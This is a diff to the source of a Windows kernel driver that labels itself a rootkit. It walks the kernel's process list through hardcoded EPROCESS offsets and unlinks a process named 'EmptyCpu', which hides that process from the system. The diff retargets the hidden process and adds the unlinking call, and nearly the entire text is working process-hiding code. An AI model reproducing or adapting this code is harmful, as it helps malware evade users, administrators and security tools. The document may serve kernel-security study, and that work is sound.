@@ -18,6 +18,7 @@ VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
 	Ktrace("ROOTKIT: OnUnload called\n");
 	if (Remove_Entry) {
 		InsertTailList(Sys_Process + 0x188, Remove_Entry);
+		Ktrace("ROOTKIT: InsertTailList : %llx", (PULONGLONG)Remove_Entry);
 	}
 	
 	return;
@@ -49,18 +50,20 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,
    Sys_Process = (PUCHAR)PsInitialSystemProcess;
    PLIST_ENTRY64 list_node = Sys_Process + 0x188;
 
-   UCHAR process_name[] = "INSTDRV";
+   UCHAR process_name[] = "EmptyCpu";
    INT	length = strlen(process_name);
-
-   while (TRUE) {
-	   PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
-	   if (memcmp(image_process_name, process_name, length) == 0) {
-		   Remove_Entry = list_node;
-		   Ktrace("ROOTKIT: RemoveEntryList : %llx", (PULONGLONG)Remove_Entry);
-		   break;
+   do {
+	   if (*(PULONGLONG)((PUCHAR)list_node - 0x188 + 0x170) == 0) {
+		   PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
+		   Ktrace("ROOTKIT: Process : %s", image_process_name);
+		   if (memcmp(image_process_name, process_name, length) == 0) {
+			   Remove_Entry = list_node;
+			   RemoveEntryList(list_node);
+			   Ktrace("ROOTKIT: RemoveEntryList : %llx-%s", (PULONGLONG)Remove_Entry, image_process_name);
+		   }  
 	   }
 	   list_node = list_node->Flink;
-   }
+   } while (Sys_Process != (PUCHAR)list_node - 0x188);
 
    return STATUS_SUCCESS;
 
